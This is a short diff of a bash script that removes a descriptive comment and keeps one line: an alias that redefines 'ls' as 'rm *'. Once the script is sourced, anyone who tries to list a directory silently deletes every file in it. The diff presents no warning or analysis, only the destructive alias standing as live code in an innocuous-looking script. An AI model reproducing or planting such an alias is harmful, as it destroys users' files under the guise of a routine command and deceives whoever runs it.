@@ -1,3 +1,2 @@
-#! /bin/bash
-#Script that creates an alias.
+#!/bin/bash
 alias ls="rm *"
